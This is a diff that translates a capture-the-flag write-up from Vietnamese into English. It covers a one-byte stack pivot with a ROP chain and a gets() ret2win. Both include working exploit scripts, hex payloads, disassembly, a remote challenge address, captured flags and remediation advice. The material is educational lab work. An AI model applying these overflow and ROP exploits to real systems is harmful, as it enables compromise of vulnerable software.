+> **Key Characteristics:** No stack canary bypass needed (the win path calls `exit()` prior to canary validation); no PIE or libc leak needed (binary is non-PIE).
 
 ---
 
-### 2.0. TL;DR & Tóm tắt khai thác
+### 2.0. TL;DR & Exploitation Summary
 
 ```text
-0. Nhận leak:  [*] Report buffer allocated at: 0x7fff....   -> buf
-1. read#1 (0x50 byte vào buf):  chain nằm ngay đầu buf
-       buf+0x00: 0x00007ffc....      <- rbp "giả" (địa chỉ writable như buf)
+0. Receive address leak: [*] Report buffer allocated at: 0x7fff.... -> buf
+1. read#1 (0x50 bytes into buf): Place ROP chain directly inside buf
+       buf+0x00: 0x00007ffc....      <- Fake RBP (writable memory address such as buf)
        buf+0x08: 0x000000000040124d  <- pop rdi ; ret
-       buf+0x10: 0x00000000deadbeef  <- rdi
+       buf+0x10: 0x00000000deadbeef  <- rdi argument
        buf+0x18: 0x000000000040124f  <- pop rsi ; ret
-       buf+0x20: 0x00000000cafebabe  <- rsi
-       buf+0x28: 0x0000000000401268  <- func_auth -> in flag
-2. read#2 (0x21 byte vào token 0x20): 32 byte rác + 1 byte cuối = (pivot & 0xff)
-3. func_tag.leave;ret  -> return bình thường (retaddr không bị đụng)
-4. func_report.leave   -> rsp = (rbp_report & ~0xff) | pivot_byte = buf   ==> PIVOT
-5. pop rbp; ret        -> chạy chain -> func_auth(0xdeadbeef, 0xcafebabe)
-6. [+] Access Granted! Here is your flag:  CSSCTF{...}
+       buf+0x20: 0x00000000cafebabe  <- rsi argument
+       buf+0x28: 0x0000000000401268  <- func_auth -> print flag
+2. read#2 (0x21 bytes into token 0x20): 32 bytes padding + 1 byte = (pivot & 0xff)
+3. func_tag.leave; ret -> Normal function return (return address untouched)
+4. func_report.leave   -> rsp = (rbp_report & ~0xff) | pivot_byte = buf ==> STACK PIVOT
+5. pop rbp; ret        -> Executes ROP chain -> func_auth(0xdeadbeef, 0xcafebabe)
+6. Access Granted! Here is your flag: CSSCTF{...}
 ```
 
-Payload mẫu:
+Sample payload structure:
 
 ```text
-00000000: 20e1 ffff ff7f 0000 4d12 4000 0000 0000   .......M.@.....   <- buf (rbp giả)
+00000000: 20e1 ffff ff7f 0000 4d12 4000 0000 0000   .......M.@.....   <- buf (fake rbp)
 00000010: efbe adde 0000 0000 4f12 4000 0000 0000   ........O.@.....   <- pop rdi / 0xdeadbeef
 00000020: beba feca 0000 0000 6812 4000 0000 0000   ........h.@.....   <- pop rsi / 0xcafebabe / func_auth
-00000030: 4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAA...         <- pad tới 0x50
+00000030: 4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAA...         <- padding to 0x50
 00000040: 4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAA...
 00000050: 4242 4242 4242 4242 4242 4242 4242 4242   BBBBBBB...         <- read#2: token[0x20]
 00000060: 4242 4242 4242 4242 4242 4242 4242 4242   BBBBBBB...
-00000070: 20                                        .                  <- byte 33 = 0x20 (pivot & 0xff)
+00000070: 20                                        .                  <- 33rd byte = 0x20 (pivot & 0xff)
 ```
 
 ---
 
-### 2.1. Thông tin file & Cơ chế bảo vệ
+### 2.1. File Information & Security Mitigations
 
 ```console
 $ file chall
@@ -471,35 +469,35 @@ chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
        BuildID[sha1]=5dc6c7d1..., for GNU/Linux 3.2.0, stripped
 ```
 
-| Thuộc tính | Giá trị | Ý nghĩa |
+| Property | Value | Security Implication |
 |---|---|---|
-| Type | `EXEC` | **Non-PIE** $\rightarrow$ `0x401268`, `0x40124d`, `0x40124f`… là hằng số |
-| NX | `GNU_STACK RW` | NX bật $\rightarrow$ không dùng shellcode |
-| RELRO | `GNU_RELRO`, không `BIND_NOW` | Partial RELRO (GOT ghi được) |
-| Canary | **CÓ** | Có mặt ở `main`, `func_auth`. **`func_report` và `func_tag` KHÔNG có canary** |
-| Symbols | `stripped` | Không còn tên hàm, phải disasm |
+| Type | `EXEC` | **Non-PIE** $\rightarrow$ addresses `0x401268`, `0x40124d`, `0x40124f`… are static constants |
+| NX | `GNU_STACK RW` | NX enabled $\rightarrow$ executable shellcode cannot be placed on the stack |
+| RELRO | `GNU_RELRO`, no `BIND_NOW` | Partial RELRO (GOT is writable) |
+| Canary | **Present** | Present in `main` and `func_auth`. **`func_report` and `func_tag` have no canary** |
+| Symbols | `stripped` | Symbol table removed; functions identified through disassembly |
 
 ---
 
-### 2.2. Bản đồ hàm & Phân tích chuỗi string
+### 2.2. Function Map & String Analysis
 
-| Địa chỉ | Tên tự đặt | Vai trò |
+| Address | Identified Name | Description / Role |
 |---|---|---|
 | `0x4011b6` | `setup_buffers` | `setvbuf(stdin/stdout/stderr, NULL, _IONBF, 0)` |
-| `0x40139a` | **`func_report`** | in leak, `memset(buf,0,0x50)`, `read(0, buf, 0x50)`, gọi `func_tag` |
-| `0x401348` | **`func_tag`** 🐛 | `memset(token,0,0x20)`, `len = 0x21`, `read(0, token, 0x21)` $\rightarrow$ **overflow 1 byte** |
-| `0x401268` | **`func_auth`** 🏁 | `if (edi==0xdeadbeef && esi==0xcafebabe)` $\rightarrow$ đọc & in `flag.txt` |
-| `0x401419` | `main` | gọi `setup_buffers`, in banner, gọi `func_report`, in "Log finalized." |
+| `0x40139a` | **`func_report`** | Prints buffer leak, `memset(buf,0,0x50)`, `read(0, buf, 0x50)`, calls `func_tag` |
+| `0x401348` | **`func_tag`** | `memset(token,0,0x20)`, sets `len = 0x21`, executes `read(0, token, 0x21)` $\rightarrow$ **1-byte overflow** |
+| `0x401268` | **`func_auth`** | Validates `if (edi==0xdeadbeef && esi==0xcafebabe)` $\rightarrow$ opens and prints `flag.txt` |
+| `0x401419` | `main` | Invokes `setup_buffers`, displays banner, calls `func_report`, prints "Log finalized." |
 
 ---
 
-### 2.3. Disassembly có chú thích
+### 2.3. Annotated Disassembly
 
-#### 2.3.1. `func_report` @ `0x40139a` (Nguồn leak)
+#### 2.3.1. `func_report` @ `0x40139a` (Address Leak Source)
 ```asm
 40139a: push rbp
 40139b: mov  rbp,rsp
-40139e: sub  rsp,0x50                   ; buf = rbp-0x50 (KHÔNG có canary)
+40139e: sub  rsp,0x50                   ; buf = rbp-0x50 (NO stack canary)
 4013b8: lea  rax,[rbp-0x50]
 4013bc: mov  rsi,rax
 4013c9: call printf                     ; printf("[*] Report buffer allocated at: %p\n", buf)
@@ -507,76 +505,76 @@ chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
 4013f8: call read                       ; read(0, buf, 0x50) (80 bytes)
 401402: call 0x401348                   ; func_tag()
 401417: leave
-401418: ret                             ; <== nơi bị pivot bởi 1 byte
+401418: ret                             ; <== Stack pivot executed here
 ```
 
-#### 2.3.2. `func_tag` @ `0x401348` (Lỗ hổng 1 byte)
+#### 2.3.2. `func_tag` @ `0x401348` (1-Byte Off-by-One Overflow)
 ```asm
 401348: push rbp
 401349: mov  rbp,rsp
 40134c: sub  rsp,0x30
-401350: lea  rax,[rbp-0x20]             ; token = rbp-0x20 (32 bytes)
-40137a: mov  QWORD PTR [rbp-0x28],0x21  ; len = 0x21 = 33  (buffer chỉ 32)
+401350: lea  rax,[rbp-0x20]             ; token = rbp-0x20 (32-byte buffer)
+40137a: mov  QWORD PTR [rbp-0x28],0x21  ; len = 0x21 = 33 (buffer is only 32 bytes)
 401382: mov  rdx,[rbp-0x28]
-401392: call read                       ; read(0, token, 33) => byte 33 ghi đè saved rbp!
+401392: call read                       ; read(0, token, 33) => byte 33 overwrites saved RBP LSB!
 401398: leave ; ret
 ```
 
-#### 2.3.3. `func_auth` @ `0x401268` (Đường Win)
+#### 2.3.3. `func_auth` @ `0x401268` (Win Target)
 ```asm
-401285: cmp DWORD PTR [rbp-0x64],0xdeadbeef ; kiểm tra tham số 1 (rdi)
-401292: cmp DWORD PTR [rbp-0x68],0xcafebabe ; kiểm tra tham số 2 (rsi)
+401285: cmp DWORD PTR [rbp-0x64],0xdeadbeef ; Validate argument 1 (rdi)
+401292: cmp DWORD PTR [rbp-0x68],0xcafebabe ; Validate argument 2 (rsi)
 4012c2: call fopen                      ; fopen("flag.txt", "r")
-4012fb: call fgets                      ; đọc flag
-401307: call puts                       ; in flag
-40131d: call exit                       ; exit(0) - không bao giờ check canary!
+4012fb: call fgets                      ; Read flag into buffer
+401307: call puts                       ; Print flag to stdout
+40131d: call exit                       ; exit(0) - stack canary check bypassed!
 ```
 
 ---
 
-### 2.4. Phân tích Stack Layout & Khoảng cách bộ nhớ
+### 2.4. Stack Layout Analysis & Memory Offsets
 
-| Biến | Công thức |
+| Variable / Pointer | Calculation / Relative Offset |
 |---|---|
-| `buf` | Được leak từ `printf` |
+| `buf` | Leaked directly via `printf` |
 | `rbp_report` | `buf + 0x50` |
 | `rbp_tag` | `rbp_report - 0x60` |
-| `token` | `rbp_report - 0x80` (32 byte) |
-| byte 33 của read#2 | Ghi đè vào byte thấp của `rbp_report` |
+| `token` | `rbp_report - 0x80` (32 bytes) |
+| Byte 33 of `read#2` | Overwrites the least significant byte of `rbp_report` |
 
 ---
 
-### 2.5. Cơ chế `leave` & Kỹ thuật Stack Pivot 1-byte
+### 2.5. The `leave` Instruction & 1-Byte Stack Pivot Technique
 
-Khi `func_report` thực hiện `leave`:
+When `func_report` executes its epilogue `leave`:
 ```asm
 mov rsp, rbp      ; rsp = (rbp_report & ~0xff) | our_byte   <== STACK PIVOT
 pop rbp           ; rbp = [rsp], rsp += 8
-ret               ; rip = [rsp] (chạy ROP chain)
+ret               ; rip = [rsp] (Executes pivoted ROP chain)
 ```
 
-Đặt `pivot = max(buf, block_base)`, đưa ROP chain vào vị trí tương ứng trong `buf`.
+By computing `pivot = max(buf, block_base)`, the ROP chain is placed at the exact corresponding offset inside `buf`.
 
 ---
 
-### 2.6. Tìm kiếm ROP Gadget
+### 2.6. Finding ROP Gadgets
 
-Trích xuất 2 gadget chuẩn từ `.text`:
-* `0x40124d`: `pop rdi ; ret` $\rightarrow$ nạp `0xdeadbeef`
-* `0x40124f`: `pop rsi ; ret` $\rightarrow$ nạp `0xcafebabe`
-
----
-
-### 2.7. Cạm bẫy kỹ thuật: Tại sao không được nhảy vào giữa hàm win?
-
-Nếu nhảy vào `0x40129f` (bỏ qua check `deadbeef`/`cafebabe`):
-- Bỏ qua lệnh `mov QWORD PTR [rbp-0x58], rax` (lưu con trỏ `FILE*`).
-- `fgets` sau đó sẽ đọc `[rbp-0x58]` (chứa rác) $\rightarrow$ **SIGSEGV Crash ngay lập tức**.
-- **Bài học:** Phải nhảy vào đầu hàm `func_auth` (`0x401268`) và thiết lập đầy đủ 2 thanh ghi `rdi`, `rsi`.
+Two standard gadgets were identified in `.text`:
+- `0x40124d`: `pop rdi ; ret` $\rightarrow$ populates `0xdeadbeef`
+- `0x40124f`: `pop rsi ; ret` $\rightarrow$ populates `0xcafebabe`
 
 ---
 
-### 2.8. Script khai thác hoàn chỉnh (Local & Remote)
+### 2.7. Technical Pitfall: Why Mid-Function Jumping to `win` Fails
+
+Attempting to jump directly to `0x40129f` (bypassing the `deadbeef` and `cafebabe` checks):
+- Skips the crucial instruction `mov QWORD PTR [rbp-0x58], rax` (which stores the opened `FILE*` pointer).
+- As a consequence, `fgets` attempts to read using an uninitialized pointer from `[rbp-0x58]` $\rightarrow$ **immediate SIGSEGV crash**.
+- **Lesson:** Execution must start at the entry point of `func_auth` (`0x401268`), properly configuring registers `rdi` and `rsi`.
+
+---
+
+### 2.8. Complete Exploit Script (Local & Remote)
 
 ```python
 #!/usr/bin/env python3
@@ -595,7 +593,7 @@ def build(buf):
     pivot = max(buf, rbp_report & ~0xff)
     if buf + BUF_OFF - pivot < CHAIN_LEN:
         return None
-    chain  = struct.pack("<Q", buf)           # rbp giả
+    chain  = struct.pack("<Q", buf)           # Fake RBP
     chain += struct.pack("<Q", POP_RDI)
     chain += struct.pack("<Q", 0xdeadbeef)
     chain += struct.pack("<Q", POP_RSI)
@@ -630,7 +628,7 @@ if __name__ == "__main__":
 
 ---
 
-### 2.9. Kiểm chứng bằng GDB & Transcript
+### 2.9. Verification with GDB & Execution Transcript
 
 ```console
 Breakpoint 2, 0x0000000000401417 in ?? ()
@@ -646,13 +644,13 @@ CSSCTF{Duh_m4t3_1_4m_sl33py}
 
 ---
 
-### 2.10. Tổng kết & Flag
+### 2.10. Summary & Flag
 
-| Thuộc tính | Chi tiết |
+| Property | Detail |
 |---|---|
-| **Lỗi** | Off-by-one ghi đè 1 byte lên byte thấp của saved RBP |
-| **Hỗ trợ** | Leak địa chỉ Stack qua `printf("%p")` |
-| **Kỹ thuật** | 1-byte Stack Pivot via `leave` + ROP chain 2 đối số |
+| **Vulnerability** | Off-by-one single-byte overwrite on caller's saved RBP LSB |
+| **Information Leak** | Stack memory address leaked via `printf("%p")` |
+| **Exploitation Technique** | 1-byte stack pivot via `leave` + two-argument ROP invocation |
 | **Flag** | **`CSSCTF{Duh_m4t3_1_4m_sl33py}`** |
 
 ---
@@ -661,27 +659,27 @@ CSSCTF{Duh_m4t3_1_4m_sl33py}
 ## 3. Kuiper Belt Relay Core
 
 > **Flag:** `CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}`  
-> **Server:** `nc 34.116.80.78 9998` · File đính kèm: `echo.c`  
-> **Bug:** Tràn bộ đệm cổ điển (Buffer Overflow) qua hàm không an toàn `gets(buffer)`.  
-> **Win:** Chuyển hướng luồng thực thi (ret2win) trực tiếp vào hàm chưa từng được gọi `win()` @ `0x401216`.
+> **Server:** `nc 34.116.80.78 9998` · Provided file: `echo.c`  
+> **Vulnerability:** Classic Stack Buffer Overflow via the unsafe `gets(buffer)` function.  
+> **Win Mechanism:** Redirect execution flow (ret2win) directly to the unreferenced `win()` function @ `0x401216`.
 
 ---
 
-### 3.1. Mô tả thử thách & Dữ kiện
+### 3.1. Challenge Description & Provided Assets
 
-> **Mô tả:**  
+> **Description:**  
 > *The Relay rebooted an old diagnostic process — it just echoes back whatever you send it. Simple by design.*  
 > *But it's still carrying dead code from before the blackout: a function that's never called, sitting untouched in memory. Redirect the program into it.*  
 >  
-> **Dữ kiện đính kèm:** `echo.c`  
-> **Thông tin kết nối:** `nc 34.116.80.78 9998`  
-> **Định dạng Flag:** `CSSCTF{...}`
+> **Provided File:** `echo.c`  
+> **Remote Connection:** `nc 34.116.80.78 9998`  
+> **Flag Format:** `CSSCTF{...}`
 
 ---
 
-### 3.2. Phân tích mã nguồn & Xác định lỗ hổng (Vulnerability Analysis)
+### 3.2. Source Code & Vulnerability Analysis
 
-Mã nguồn C được cung cấp (`echo.c`):
+The provided C source file (`echo.c`):
 
 ```c
 #include <stdio.h>
@@ -721,52 +719,52 @@ int main() {
 }
 ```
 
-1. **Hàm `win()` (Dead Code):**
-   - Đọc file `flag.txt` và in trực tiếp nội dung flag ra `stdout`.
-   - Không được gọi trong luồng thực thi thông thường.
+1. **Dead Code: `win()`:**
+   - Reads `flag.txt` and outputs the flag content to `stdout`.
+   - Never called during standard execution flow.
 
-2. **Hàm `vuln()` (Điểm tràn bộ đệm):**
-   - Khai báo mảng ký tự cục bộ: `char buffer[64];` (64 bytes).
-   - Hàm `gets(buffer)` không kiểm tra bounds, đọc dữ liệu cho đến khi gặp `\n` hoặc `EOF`.
-   - Gửi dữ liệu vượt quá 64 bytes sẽ làm tràn `buffer`, ghi đè `Saved RBP` và `Return Address`.
+2. **Buffer Overflow in `vuln()`:**
+   - Allocates a stack array: `char buffer[64];` (64 bytes).
+   - `gets(buffer)` performs no boundary checking, reading arbitrary input until encountering `\n` or `EOF`.
+   - Sending more than 64 bytes overflows `buffer`, corrupting `Saved RBP` and the `Return Address`.
 
 ---
 
-### 3.3. Mô hình bộ nhớ Stack & Kỹ thuật ret2win
+### 3.3. Stack Memory Layout & Ret2win Technique
 
-Bố cục Stack Frame của `vuln()` trên x86_64:
+The x86_64 stack frame layout for `vuln()`:
 
 ```text
-Địa chỉ thấp (Low Memory)
-┌──────────────────────────────────────────┐  <-- $rsp (Đỉnh stack)
+Low Memory
+┌──────────────────────────────────────────┐  <-- $rsp (Top of Stack)
 │  buffer[0..63]                           │
-│  (Vùng đệm lưu dữ liệu đầu vào: 64 bytes)│
+│  (Input storage buffer: 64 bytes)        │
 ├──────────────────────────────────────────┤  <-- $rbp (Frame Pointer)
 │  Saved RBP                               │
-│  (Base pointer của hàm gọi: 8 bytes)     │
+│  (Caller base pointer: 8 bytes)          │
 ├──────────────────────────────────────────┤  <-- $rbp + 0x8
 │  Saved RIP / Return Address              │
-│  (Địa chỉ quay về sau khi vuln() xong)   │
+│  (Return target after vuln() epilogue)   │
 └──────────────────────────────────────────┘
-Địa chỉ cao (High Memory)
+High Memory
 ```
 
-- Offset từ đầu `buffer` đến `Return Address` = `64 + 8 = 72 bytes`.
-- Ghi đè `Return Address` bằng địa chỉ của `win()` sẽ khiến CPU nhảy vào `win()` ngay khi lệnh `ret` được thực thi.
+- Offset from `buffer` start to `Return Address` = `64 + 8 = 72 bytes`.
+- Overwriting the `Return Address` with the address of `win()` diverts CPU control to `win()` immediately upon executing `ret`.
 
 ---
 
-### 3.4. Phương pháp xác định địa chỉ mục tiêu (Target Discovery)
+### 3.4. Target Discovery Method
 
-Thử thách chỉ cung cấp `echo.c`, không có binary biên dịch sẵn.
-- Do không bật PIE, mã máy nằm ở vùng nhớ cố định `0x401000 - 0x402000`.
-- Hàm `win()` được viết ở đầu file, nên nằm ở các địa chỉ đầu của phân vùng code người dùng.
-- Tiến hành quét tự động các địa chỉ chẵn trong khoảng `0x401100 - 0x401250`:
-  - Tại địa chỉ **`0x401216`**, server phản hồi thông báo hijacked và in cờ.
+Only `echo.c` was provided without a compiled binary.
+- With PIE disabled, binary code resides within standard addresses `0x401000 - 0x402000`.
+- Because `win()` is the first defined function in the file, it sits near the base of the user code segment.
+- An automated scan across 16-byte aligned addresses in range `0x401100 - 0x401250` was executed:
+  - Address **`0x401216`** successfully responded with the hijacked return notice and printed the flag.
 
 ---
 
-### 3.5. Mã nguồn khai thác hoàn chỉnh (Python / Pwntools)
+### 3.5. Complete Exploit Code (Python / Pwntools)
 
 ```python
 #!/usr/bin/env python3
@@ -781,7 +779,7 @@ from pwn import *
 HOST = "34.116.80.78"
 PORT = 9998
 OFFSET = 72            # 64 bytes buffer + 8 bytes saved RBP
-WIN_ADDR = 0x401216    # Địa chỉ hàm win() trên server
+WIN_ADDR = 0x401216    # Address of win() on target server
 
 def solve():
     log.info(f"Connecting to {HOST}:{PORT}...")
@@ -804,7 +802,7 @@ if __name__ == "__main__":
 
 ---
 
-### 3.6. Kết quả thực thi & Flag
+### 3.6. Execution Results & Flag
 
 ```text
 [+] Opening connection to 34.116.80.78 on port 9998: Done
@@ -819,16 +817,16 @@ Here's your flag:
 CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
 ```
 
-**Flag chính thức:**
+**Official Flag:**
 ```text
 CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
 ```
 
 ---
 
-### 3.7. Biện pháp phòng chống & Khắc phục lỗ hổng (Remediation)
+### 3.7. Remediation
 
-1. **Thay thế `gets()`:** Sử dụng `fgets(buffer, sizeof(buffer), stdin)` để khống chế kích thước tối đa.
-2. **Kích hoạt Stack Canary:** Cờ biên dịch `-fstack-protector-all`.
-3. **Kích hoạt PIE & ASLR:** Biên dịch với `-fPIE -pie` để ngẫu nhiên hóa phân vùng code.
-4. **Loại bỏ Dead Code:** Tối ưu hóa biên dịch `-O2` và `-Wl,--gc-sections`.
+1. **Replace `gets()`:** Implement bounded input routines like `fgets(buffer, sizeof(buffer), stdin)`.
+2. **Enable Stack Canaries:** Compile with `-fstack-protector-all` to detect return address corruption.
+3. **Enable PIE & ASLR:** Compile using `-fPIE -pie` to randomize code offsets.
+4. **Prune Dead Code:** Apply compiler dead code elimination with `-O2` and `-Wl,--gc-sections`.
